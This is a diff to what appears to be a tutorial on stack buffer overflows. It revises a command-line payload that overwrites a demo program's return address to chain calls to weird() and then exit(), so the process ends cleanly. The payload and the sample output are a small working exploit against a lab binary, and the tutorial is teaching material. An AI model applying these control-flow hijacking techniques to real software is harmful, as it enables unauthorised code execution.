@@ -639,15 +639,16 @@ The "Segmentation fault" at the end, here, only comes about because, when
 the CPU goes to fetch the return address from the stack upon reaching the
 end of weird(), it finds nothing that points to executable code. We can
 remedy this by putting _another_ address at the end of our "name". For now,
-let's just put the address of weird() again:
+let's just put the address of **weird()** again, followed by the address of
+**exit()**, which nm shows to lie at 0x0804fda0, so that we can terminate the
+process without incurring a segfault.
 
 ```
-$ ./hello 1234567890123456789012$'\x05\x9b\x04\x08'$'\x05\x9b\x04\x08'
+$ ./hello 1234567890123456789012$'\x05\x9b\x04\x08'$'\x05\x9b\x04\x08'$'\xa0\xfd\x04\x08'
 This program is going to greet you.
 Hello, 1234567890123456789012!
 ph'nglui mglw'nafh Cthulhu R'lyeh wgah'nagl fhtagn
 ph'nglui mglw'nafh Cthulhu R'lyeh wgah'nagl fhtagn
-Segmentation fault (core dumped)
 ```
 
 We can, in fact, put any sequence of addresses that we like. We can call 
